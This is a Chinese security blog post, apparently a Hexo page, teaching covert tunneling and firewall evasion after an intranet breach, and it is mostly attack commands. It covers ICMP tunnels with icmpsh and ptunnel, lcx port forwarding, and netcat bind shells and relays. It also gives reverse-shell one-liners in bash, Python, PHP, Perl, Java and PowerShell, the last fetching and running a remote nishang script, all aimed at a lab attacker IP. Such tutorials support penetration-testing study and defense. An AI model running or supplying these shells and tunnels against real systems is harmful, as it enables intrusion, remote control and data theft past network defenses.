@@ -1,0 +1,249 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>隐藏通信隧道技术 - Guko's Blog</title><meta name="description" content="完成内网信息收集后，需要判断流量是否出的去、进得来。隐藏通信隧道技术常用于在访问受限网络环境中追踪数据流向和在非受信任的网络中实现安全的数据传输0x01 隐藏通信隧道基础知识1.隐藏通信隧道概述一般的网络通信，现在两台机器之间建立TCP连接，之后进行正常的数据通信。在知道IP地址的情况喜爱，可以直接"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">隐藏通信隧道技术</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">隐藏通信隧道技术</h1><div class="post-meta">2020-04-22<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><p>完成内网信息收集后，需要判断流量是否出的去、进得来。隐藏通信隧道技术常用于在访问受限网络环境中追踪数据流向和在非受信任的网络中实现安全的数据传输</p>
+<p><img src="/2020/04/22/隐藏通信隧道技术/22.png" alt></p>
+<a id="more"></a>
+
+<h4 id="0x01-隐藏通信隧道基础知识"><a href="#0x01-隐藏通信隧道基础知识" class="headerlink" title="0x01 隐藏通信隧道基础知识"></a>0x01 隐藏通信隧道基础知识</h4><p><strong>1.隐藏通信隧道概述</strong></p>
+<p>一般的网络通信，现在两台机器之间建立TCP连接，之后进行正常的数据通信。在知道IP地址的情况喜爱，可以直接发送报文；如果不知道IP地址，需要将域名解析成IP地址。在实际的网络中，通常会通过各种边界设备、软硬件防火墙或者入侵检测系统来检测对外连接情况，如有异常，则对通信进行阻断。</p>
+<p>这里的隧道，<code>指的是一种绕过端口屏蔽的通信方式</code>。防火墙的两端数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。</p>
+<p>常见隧道如下：</p>
+<ul>
+<li>网络层：IPv6隧道、ICMP隧道、GRE隧道</li>
+<li>传输层：TCP隧道、UDP隧道、常规端口转发</li>
+<li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li>
+</ul>
+<p><strong>2.判断内网的连通性</strong></p>
+<p>判断内网的连通性是指判断机器能否上外网等。综合判断各种协议<code>（TCP、HTTP、DNS、ICMP）</code>及端口通信的情况。常见的允许流量流出的端口有<code>80、8080、443、53、110、123</code>常见的内网连通信判断如下：</p>
+<p>（1）ICMP协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping &lt;IP地址活域名&gt;</span><br></pre></td></tr></table></figure>
+
+<p>（2）TCP协议</p>
+<p><code>netcat</code>简称nc,瑞士军刀，通过使用TCP活UDP协议的网络连接读取数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;IP地址 端口号&gt;</span><br><span class="line">nc -zv 192.168.197.244 139</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/1.png" alt></p>
+<p>(3) HTTP协议</p>
+<p>curl是一个利用URL规则在命令行下工作的综合文件传输工具，支持文件上传和下载。curl命令不仅支持HTTP、HTTPS、FTP等众多协议，还支持POST、Cookie、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征</p>
+<p>使用方法如下，远程主机开启来相应端口，会输出相应端口的信息，若没有开通相应端口，则无提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &lt;IP地址:端口号&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/2.png" alt></p>
+<p>(4) DNS协议</p>
+<p>DNS连通信检测时，常用命令为<code>nslookup</code>和<code>dig</code></p>
+<p>nslookup为windwos系统自带DNS探测命令，在没有指定vps-ip的时候，nslookup会从系统网络的TCP/IP属性中读取DNS服务器的地址，使用方法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baidu.com vps-ip</span><br><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/3.png" alt></p>
+<p>dig是Linux默认自带的DNS探测命令，在没有指定vps-ip的时候，dig会到etc/resolv.conf文件中读取系统配置的DNS服务器地址，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig www.baidu.com //基本使用方法</span><br><span class="line">dig @vps-ip www.baidu.com //</span><br><span class="line">dig -h //查看帮助</span><br></pre></td></tr></table></figure>
+
+<p>另外一种情况是流量不能直接出，需要在内网中设置代理服务器，如通过企业办公网段上网的场景。常用判断方式如下</p>
+<ul>
+<li>查看网络连接，判断是否存在存在与其他机器的8080（不绝对）等端口的连接（可尝试运行ping -n 1 -a ip命令）</li>
+<li>查看内网中是否有主机名类似<code>proxy</code>机器</li>
+<li>查看IE浏览器的直接代理</li>
+<li>根据pac文件的路径（可能是本地路径，也可能是远程路径）将其下载下来并查看</li>
+<li>执行如下命令，利用curl工具进行确认</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.baidu.com  //不通</span><br><span class="line">curl -x proxy-ip:port www.baidu.com  //通</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-网络层隧道技术"><a href="#0x02-网络层隧道技术" class="headerlink" title="0x02 网络层隧道技术"></a>0x02 网络层隧道技术</h4><p><strong>1.IPv6隧道</strong></p>
+<p>IPv6速到技术是指通过IPv4隧道传送IPv6数据报文的技术。为了在IPv4海洋中传输IPv6信息，可以将IPv4作为隧道载体，将IPv6整体封装在IPv4数据报文中，使用IPv6报文能够穿过IPv4海洋，到达另一个IPv6小岛</p>
+<p>IPv6隧道工作流程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、节点A要向节点B发送IPv6报文，首先要在节点A和节点B之间建立一条隧道</span><br><span class="line">2、节点A将IPv6报文封装在以节点B的IPv4地址为目的地址、以自己的IPv4地址为源地址的IPv4报文中，并发往IPv4海洋</span><br><span class="line">3、在IPv4海洋中，这个报文和普通IPv4报文一样，经过IPv4的转发到达节点B</span><br><span class="line">4、节点Bs收到此报文之后，解除IPv4封装，取出其中的IPv6报文</span><br></pre></td></tr></table></figure>
+
+<p>现阶段的边界设备、防火墙或入侵防御系统还无法识别IPv6的通信数据，可通过相关来配置IPv6通信的设备，以避开防火墙和入侵检测系统。注意：即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包。</p>
+<p>配置隧道和自动隧道的区别是：只有在执行隧道功能的节点的IPv6地址是IPv4兼容地址时，自动隧道才可行。在为执行隧道功能节点分配IP地址时，如果采用的是自动隧道方法，就不需要进行配置。</p>
+<p>配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如次啊用DHCP、人工配置或其他IPv4的配置机制</p>
+<p>支持IPv6的隧道工具有 socat 6tunnel nt6tunnel等</p>
+<p><strong>2.ICMP隧道</strong></p>
+<p>ICMP隧道简单、实用。在一般通信协议里，如果两台设备要进行，是需要开放端口的，而在ICMP协议下则不需要。常见的ICMP消息为ping命令。</p>
+<p>在某些网络环境中，在使用了各类上层隧道（如HTTP隧道、DNS隧道、常规正/反向端口转发等）进行操作失败的情况下，会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙（通常防火墙不会屏蔽ping数据包）实现不受限制的网络访问</p>
+<p>常用的ICMP隧道工具有icmpsh 、PingTunnel、icmptunnel、powershell icmp等</p>
+<p>（1）icmpsh</p>
+<p>imcpsh使用简单、跨平台，运行不需管理员权限</p>
+<p>下载地址：<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a></p>
+<p>使用强需要安装python的impacket类库，便于对TCP、UDP、ICMP、IGMP、ARP、IPv4、IPv6、SMB、MSRPC、NTLM、Kerberos、WMI、LDAP等协议进行访问，因为icmpsh工具要替代系统本省ping命令的应答程序，所以需要关闭本地系统的ICMP应答（如果要恢复系统应答，设置为0）否则shell运行会不稳定</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/inquisb/icmpsh.git //下载</span><br><span class="line">apt-get install python-impacket </span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1 //需要关闭本地系统的ICMP应答</span><br></pre></td></tr></table></figure>
+
+<p>在攻击机输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./icmpsh_m.py 192.168.197.203 192.168.197.244</span><br></pre></td></tr></table></figure>
+
+<p>在目标机输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh.exe -t 192.168.197.203</span><br></pre></td></tr></table></figure>
+
+<p>即可收到返回的shell</p>
+<p><img src="/2020/04/22/隐藏通信隧道技术/4.png" alt></p>
+<p>(2) PingTunnel</p>
+<p>安装</p>
+<p>下载地址:<a href="http://freshmeat.sourceforge.net/projects/ptunnel/" target="_blank" rel="noopener">http://freshmeat.sourceforge.net/projects/ptunnel/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">解压</span><br><span class="line">tar xf PingTunnel-0.72.tar.gz </span><br><span class="line"></span><br><span class="line">切换目录</span><br><span class="line">cd PingTunnel</span><br><span class="line"></span><br><span class="line">编译</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">如出现问题缺少pcap.h</span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar zxvf libpcap-1.9.0.tar.gz</span><br><span class="line">cd libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line"></span><br><span class="line">如再出现问题yacc包错误</span><br><span class="line">sudo apt-get install -y byacc</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line"></span><br><span class="line">kali安装命令(PS:kali自带)</span><br><span class="line">apt install ptunnel</span><br></pre></td></tr></table></figure>
+
+<p>PingTunel使用方法：</p>
+<p>PingTunel参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-x:指定ICMP隧道连接的验证密码</span><br><span class="line">-lp:指定要监听的本地TCP端口</span><br><span class="line">-da:指定要转发的目标机器的IP地址</span><br><span class="line">-dp:指定要转发的目标机器的TCP端口</span><br><span class="line">-p:指定ICMP隧道另一端机器的IP地址</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击机-&gt;VPS(安装ptunnel)-&gt;跳板机(安装ptunnel)-&gt;受控机</span><br></pre></td></tr></table></figure>
+
+<p>跳板机隧道命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -x shuteer</span><br></pre></td></tr></table></figure>
+
+<p>VPS机器运行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 192.168.0.119 -lp 1080 -da 192.168.1.4 -dp 3389 -x shuteer</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x03-传输层隧道技术"><a href="#0x03-传输层隧道技术" class="headerlink" title="0x03 传输层隧道技术"></a>0x03 传输层隧道技术</h4><p>传输层技术包含TCP隧道、UDP隧道和常规端口转发。渗透中，如果内网防火墙阻止了对指定端口的访问，在获得目标机器的权限后，可以只用IPTABLES打开质地昂端口，若内网存在一系列防御系统，TCP、UDP流量会被大量拦截</p>
+<p><strong>1.lcx端口转发</strong></p>
+<p>lcx经典端口转发工具，基于Socket套接字实现的端口转发工具。正常的隧道需具备两端：一端为服务端，监听一个端口，等待客户端的连接，另一端为客户端，通过传入服务端的IP地址和端口，才能主动与服务器连接</p>
+<p>（1）内网端口转发</p>
+<p>目标机器上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将目标机器3389端口的所有数据转发到公网VPS的444端口上</span><br><span class="line">lcx.exe -slave &lt;公网vps-ip&gt; 4444 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+
+<p>在VPS上执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将本机4444端口上监听的所有数据转发到本机的5555端口上</span><br><span class="line">lcx.exe -listen 4444 5555</span><br></pre></td></tr></table></figure>
+
+<p>用mstsc登录“&lt;公网主机IP地址&gt;:5555”,或VPS上用mstsc登录主机127.0.0.1的555端口，即可访问目标机的3389端口</p>
+<p>（2）本地端口映射</p>
+<p>由于防火墙的限制，部分端口（如3389）数据无法通过防火墙，可将目标服务器相应端口的数据透传到防火墙允许的其他端口（如53）如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从远程桌面连接主机的53端口</span><br><span class="line">lcx -tran 53 &lt;目标主机IP地址&gt; 3389</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.netcat</strong></p>
+<p><strong>1.安装</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">linux</span><br><span class="line"></span><br><span class="line">sudo yum install nc.x86_64</span><br><span class="line"></span><br><span class="line">windows</span><br><span class="line"></span><br><span class="line">https://joncraton.org/files/nc111nt.zip</span><br><span class="line">https://joncraton.org/files/nc111nt_safe.zip</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.简单使用</strong></p>
+<p>（1）命令查询</p>
+<p><img src="/2020/04/22/隐藏通信隧道技术/5.png" alt></p>
+<p>netcat参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-d:后台程序</span><br><span class="line">-e:程序重定向</span><br><span class="line">-h:在线帮助</span><br><span class="line">-i &lt;延迟秒数&gt;：设置时间隔，以便传送信息及扫描通信端口</span><br><span class="line">-l:使用监听模式，管理和控制传入的数据</span><br><span class="line">-n:直接使用IP地址（不通过域名服务器）</span><br><span class="line">-o &lt;输出文件&gt;:指定文件名称，把往来传输的数据转换为十六进制字节码后保存在该文件中</span><br><span class="line">-g &lt;网关&gt;：设置路由器跃程通信网关，最多8个</span><br><span class="line">-G &lt;指向器数目&gt;：设置源路由指向器的数量，值为4的倍数</span><br><span class="line">-p &lt;通信端口&gt;：设置本地主机使用的通信端口</span><br><span class="line">-r:随机指定本地与远程主机的通信端口</span><br><span class="line">-s &lt;源地址&gt;：设置本地主机送出数据包的IP地址</span><br><span class="line">-u:使用UDP传输协议</span><br><span class="line">-v:详细输出</span><br><span class="line">-w &lt;超时秒数&gt;:设置等待连线的时间</span><br><span class="line">-z:将输入/输出功能关闭，只在扫描通信端口时使用</span><br></pre></td></tr></table></figure>
+
+<p>（2）Banner抓取</p>
+<p>服务的Banner信息能够为系统管理员提供当前网络中的系统信息和所运行服务的情况</p>
+<p>命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nv &lt;目标IP&gt; &lt;端口&gt;</span><br><span class="line">nc -nv 192.168.197.241 139</span><br></pre></td></tr></table></figure>
+
+<p>（3）连接远程主机</p>
+<p>命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvv &lt;目标IP&gt; &lt;端口&gt;</span><br><span class="line">nc -nvv 192.168.197.241 139</span><br></pre></td></tr></table></figure>
+
+<p>(4)  端口扫描</p>
+<p>扫描指定端口，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v &lt;目标IP&gt; &lt;端口&gt;</span><br><span class="line">nc -vv 192.168.197.241 139</span><br></pre></td></tr></table></figure>
+
+<p>扫描指定主机某个端口段（速度慢）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v -z 192.168.197.241 100-500</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/6.png" alt></p>
+<p>(5) 端口监听</p>
+<p>监听本地端口，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/7.png" alt></p>
+<p>(6) 文件传输</p>
+<p>本地主机，开始监听，等待连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 333 &gt;pentest.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/10.png" alt></p>
+<p>目标机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vn 192.168.197.203 333 &lt; test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/9.png" alt></p>
+<p>(7) 简易聊天</p>
+<p>本地主机，监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 888</span><br></pre></td></tr></table></figure>
+
+<p>目标机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vn 192.168.197.203 888</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/8.png" alt></p>
+<p><strong>3.获取shell</strong></p>
+<p>正向shell：客户端连接服务器，客户端向要获取服务器的shell，称为正向shell</p>
+<p>反向shell：客户端连接服务器，服务器想要获取客户端的shell，称为反向shell</p>
+<p>反向shell通常用在开启防护措施的目标机上，如防火墙过滤，端口转发</p>
+<p>(1) 正向shell</p>
+<p>目标机，监听目标主机4444端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444 -e /bin/sh //linux</span><br><span class="line">nc -lvp 4444 -e C:\Windows\System32\cmd.exe //widnwos</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/11.png" alt></p>
+<p>攻击机,连接目标主机的4444端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.197.203 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/12.png" alt></p>
+<p>（2）反向shell</p>
+<p>攻击机，监听本地9999端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/14.png" alt></p>
+<p>目标机，连接攻击机的9999端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.197.203 9999 -e /bin/sh //linux</span><br><span class="line">nc 192.168.197.203 9999 -e C:\Windows\System32\cmd.exe //widnwos</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/13.png" alt></p>
+<p><strong>4.在目标主机中没有nc时获取反向shell</strong></p>
+<p>在没有nc的时候，可使用其他工具和编程语言来代替nc，常用的几种反向shell如下</p>
+<p>（1）python反向shell</p>
+<p>攻击机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
+
+<p>目标机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.197.203&quot;,2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/16.png" alt></p>
+<p>再回过来看攻击机</p>
+<p><img src="/2020/04/22/隐藏通信隧道技术/15.png" alt></p>
+<p>（2）Bash反向shell</p>
+<p>攻击机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>目标机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.197.203/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>再返回看攻击机，已建立连接</p>
+<p><img src="/2020/04/22/隐藏通信隧道技术/17.png" alt></p>
+<p>(3) PHP反向shell</p>
+<p>攻击机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>目标机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;192.168.197.203&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+
+<p>返回看攻击机，已建立连接</p>
+<p><img src="/2020/04/22/隐藏通信隧道技术/18.png" alt></p>
+<p>(4) Perl反向shell</p>
+<p>攻击机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p>目标机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;192.168.197.203&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
+
+<p>返回看攻击机，已建立连接</p>
+<p><img src="/2020/04/22/隐藏通信隧道技术/18.png" alt></p>
+<p>(5) java反弹</p>
+<p>目标机器执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.197.203/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+
+<p>(6) powershell</p>
+<p>目标机器执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.197.203 -port 4444</span><br></pre></td></tr></table></figure>
+
+<p><strong>5.内网代理</strong></p>
+<p>假设获取web服务器权限，但攻击机不能访问数据库服务器，但web服务器是可以访问数据库服务器，现在要获取目标数据库服务器的shell</p>
+<p>攻击机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 3333</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/19.png" alt></p>
+<p>目标机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 3333 -e /bin/sh //linux</span><br><span class="line">nc -lvp 3333 -e C:\Windows\System32\cmd.exe //widnwos</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/21.png" alt></p>
+<p>跳板机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v 192.168.197.203 333 -c &quot;nc -v 192.168.197.247 3333&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/22/隐藏通信隧道技术/20.png" alt></p>
+</div><!--文章标签--><div class="tags"></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/复现/">复现</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/metasploit/" style="font-size: 16px;">metasploit</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/文件读取/" style="font-size: 12px;">文件读取</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a 